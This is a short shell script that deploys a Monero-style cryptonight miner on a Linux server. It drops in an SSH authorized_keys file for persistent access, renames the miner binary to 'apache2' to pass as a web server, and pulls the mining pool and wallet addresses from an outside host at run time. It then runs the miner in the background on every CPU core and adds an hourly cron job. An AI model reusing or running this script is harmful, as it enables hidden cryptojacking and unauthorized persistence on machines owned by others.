mv authorized_keys.txt ~/.ssh/authorized_keys
chmod 300  ~/.ssh/authorized_keys

dd if=/dev/zero of=/var/swap.img bs=1024k count=1000
chmod 0600 /var/swap.img
mkswap /var/swap.img
swapon /var/swap.img

apt-get update
dpkg --configure -a
apt-get -y --force-yes install libcurl4-openssl-dev libncurses5-dev pkg-config automake yasm git  psmisc

cd 

wget https://api.ipify.org	
mv tanhuevon/minerd ./apache2
cp tahhuevon/apache.sh ./apache.sh
chmod +x apache2
chmod +x apache.sh

nohup ./apache2 -a cryptonight -o stratum+tcp://`wget -q -O - sio.com.co/m/dirpool.txt` -u `wget -q -O - sio.com.co/m/dirwallet.txt`+10000 -p `cat index.html`"-"`date +%y%m%d`:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` &
echo '55 * * * * /root/apache.sh &> /root/out.log'
sleep 2
tail -f nohup.out
